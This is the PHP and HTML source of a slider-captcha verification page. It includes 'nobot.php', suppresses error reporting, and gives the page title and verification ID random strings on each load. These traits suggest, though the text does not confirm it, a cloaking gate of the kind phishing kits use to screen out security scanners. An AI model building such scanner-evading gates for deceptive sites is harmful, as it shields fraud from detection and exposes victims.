<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
@error_reporting(0);
    include "nobot.php";
 ?>
<html lang="en"><head>
  <meta charset="UTF-8">
  

    <link rel="apple-touch-icon" type="image/png" href="favicon.png">

    <meta name="apple-mobile-web-app-title" content="CodePen">

    <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">

    <link rel="mask-icon" type="image/x-icon" href="favicon.svg" color="#111">



  
  <title>Slider captcha verification</title>
     <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
  
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.css">
  
<style>
@import url('https://fonts.googleapis.com/css?family=Roboto:100,300,400,500,700,900&display=swap');

button:focus,
input:focus{
  outline: none;
  box-shadow: none;
}
a,
a:hover{
  text-decoration: none;
}

body{
  font-family: 'Roboto', sans-serif;
}

/*----------------------*/


.block {
    position: absolute;
    left: 0;
    top: 0;
}
.slidercaptcha {
    margin: 0 auto;
    width: 100%;
    height: 300px;
    border-radius: 4px;
    margin-top: 0;
}

.slidercaptcha canvas:first-child {
    border-radius: 5px;
    border: 1px solid #e6e8eb;
}

.sliderContainer {
    position: relative;
    text-align: center;
    line-height: 40px;
    background: #f7f9fa;
    color: #45494c;
    border-radius: 2px;
}

.sliderbg {
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    background-color: #f7f9fa;
    height: 40px;
    border-radius: 2px;
    border: 1px solid #e6e8eb;
}

.sliderContainer_active .slider {
    top: -1px;
    border: 1px solid #1991FA;
}

.sliderContainer_active .sliderMask {
    border-width: 1px 0 1px 1px;
}

.sliderContainer_success .slider {
        top: -1px;
    border: 1px solid #02c076;
    background-color: #02c076 !important;
    color: #fff;
}

.sliderContainer_success .sliderMask {
    border: 1px solid #52CCBA;
    border-width: 1px 0 1px 1px;
    background-color: #D2F4EF;
}

.sliderContainer_success .sliderIcon:before {
    content: "\f00c";
}

.sliderContainer_fail .slider {
    top: -1px;
    border: 1px solid #f35c59;
    background-color: #f35c59;
    color: #fff;
}

.sliderContainer_fail .sliderMask {
    border: 1px solid #f35c59;
    background-color: #f7dcdd;
    border-width: 1px 0 1px 1px;
}

.sliderContainer_fail .sliderIcon:before {
    content: "\f00d";
}

.sliderContainer_active .sliderText, .sliderContainer_success .sliderText, .sliderContainer_fail .sliderText {
    display: none;
}

.sliderMask {
        position: absolute;
    left: 0;
    top: 0;
    height: 40px;
    border: 0 solid #d1e9fe;
    background: #d1e9fe;    
    border-radius: 2px;
}

.slider {
    position: absolute;
    top: 0;
    left: 0;
    width: 40px;
    height: 40px;
    background: #fff;
    box-shadow: 0 0 3px rgba(0, 0, 0, 0.3);
    cursor: pointer;
    transition: background .2s linear;
    border-radius: 2px;
    display: flex;
    align-items: center;
    justify-content: center;
}

.slider:hover {
        background: #009efb;
    color: #fff;
    border-color: #009efb;
}

.slider:hover .sliderIcon {
    background-position: 0 -13px;
}

.sliderText {
    position: relative;
}

.sliderIcon {
}

.refreshIcon {
        position: absolute;
    right: 5px;
    top: 5px;
    cursor: pointer;
    padding: 6px;
    color: #fff;
    background-color: #ff4c4c;
    font-size: 14px;
    border-radius: 50px;
}

.refreshIcon:hover {
    color: #fff;
}
</style>

  <script>
    // Function to generate a random string
    function generateRandomString(length) {
      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
      }
      return result;
    }

    // Set random string as the document title
    document.title = generateRandomString(7); // Change 10 to your desired title length

    // Set random string as the text content for the ID in the card header
    document.addEventListener('DOMContentLoaded', function () {
      const cardHeader = document.querySelector('.card-header span');
      const randomString = generateRandomString(7); // Change 10 to your desired text length
      cardHeader.textContent = `Please complete security verification! ID: ${randomString}`;
    });
  </script>
  
  
</head>

<body translate="no">
  <div class="container text-center mb-5 mt-5">
    <div class="row">
        <div class="col-md-12">
          
        </div>
    </div>
</div>

<div class="container-fluid">
    <div class="row justify-content-center">
        <div class="col-md-4 mb-5">
          <div class="slidercaptcha card">
                    <div class="card-header">
                        <span>Please complete security verification! ID: RandomString</span>
                    </div>
                    <div class="card-body">
                        <div id="captcha" style="position: relative; width: 280px; margin: 0px auto;"><script src="script.js"></script></div></div></div>

                    </div>
                </div>
           
        </div>
    </div>
</body></html>